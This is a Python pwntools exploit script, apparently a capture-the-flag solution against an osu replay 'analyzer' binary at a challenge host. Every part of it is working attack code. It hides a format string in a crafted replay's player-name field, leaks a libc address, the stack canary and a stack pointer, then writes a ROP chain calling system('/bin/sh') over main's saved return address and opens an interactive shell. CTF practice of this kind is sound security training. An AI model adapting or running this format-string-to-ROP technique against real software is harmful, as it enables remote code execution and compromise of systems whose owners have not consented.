#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *
from tqdm import tqdm

elf = context.binary = ELF("./analyzer_patched", checksec=False)
libc = elf.libc


def start(argv=[], *a, **kw):
    nc = "nc chal.osugaming.lol 7273"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def enc_str(s: bytes):
    enc = b""
    enc += p8(11)  # string identifier
    # length
    enc += p8(len(s))
    enc += s
    return enc


def craft(name: bytes):
    hash = b"hash"
    payload = b""
    payload += p8(1)  # osu mode
    payload += p32(0)  # padding
    payload += enc_str(hash)
    payload += enc_str(name)
    payload += enc_str(b"junk")
    payload += p8(0) * 10  # padding
    payload += p16(1337)  # miss data
    if len(payload) % 2 != 0:
        payload += p8(0)
    return payload.hex().encode()


def exec_fmt(payload):
    with context.quiet:
        io = start()
    io.sendline(craft(payload))
    io.recvuntil(b"name: ")
    resp = io.recvline()
    with context.quiet:
        io.close()
    return resp


def printf_leak(offset):
    payload = f"%{offset}$p".encode()
    io.sendlineafter(b":\n", craft(payload))
    io.recvuntil(b"name: ")
    leak = io.recvline(keepends=False)
    if leak == b"(nil)":
        leak = 0
    else:
        leak = int(leak, 16)
    return leak


env = {}
io = start()

# fs = FmtStr(execute_fmt=exec_fmt)
offset = 14

# for i in range(1, 0x40):
#     log.info(f"{i}: {printf_leak(i):#x}")

libc_leak = printf_leak(3)
libc.address = libc_leak - 0x114887
assert (libc.address & 0xfff == 0)
log.info(f"{libc.address=:#x}")

canary = printf_leak(47)
log.info(f"{canary=:#x}")

stack_leak = printf_leak(6)
main_saved_rip = stack_leak - 0x118 + 0x8
log.info(f"{main_saved_rip=:#x}")

pop_rdi = libc.address + 0x001bbea1
ret = pop_rdi + 1

binsh_str = next(libc.search(b"/bin/sh\x00"))
system = libc.sym["system"]

chain = flat(
    pop_rdi, binsh_str,
    ret,
    system,
)

chunk = 8
for i in tqdm(range(0, len(chain), chunk)):
    payload = fmtstr_payload(offset,
                             {main_saved_rip + i: chain[i:i + chunk]},
                             write_size="short")
    io.sendlineafter(b":\n", craft(payload))

io.sendlineafter(b":\n", b"\n")

io.interactive()
